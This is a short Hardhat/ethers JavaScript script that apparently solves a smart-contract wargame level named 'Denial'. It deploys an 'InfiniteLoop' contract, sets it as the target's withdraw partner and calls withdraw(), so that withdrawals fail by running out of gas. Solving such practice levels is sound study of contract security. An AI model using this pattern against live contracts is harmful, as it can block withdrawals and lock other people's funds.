const path = require('path');
const addresses = require('../Addresses.json');

async function main() {
    const scriptName = path.basename(__filename, '.js');
    console.log('----------', scriptName, '----------');

    const accounts = await ethers.getSigners();
    const sender = accounts[0];

    const denialAddress = addresses[scriptName];

    const InfiniteLoop = await ethers.getContractFactory('InfiniteLoop');
    const infiniteLoop = await InfiniteLoop.deploy();
    const infiniteLoopContract = await infiniteLoop.deployed();

    const denialContract = await ethers.getContractAt("IDenial", denialAddress);
    await denialContract.setWithdrawPartner(infiniteLoopContract.address)
    const txSolve = await denialContract.withdraw()

    console.log('----------End----------', txSolve.hash);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });
  

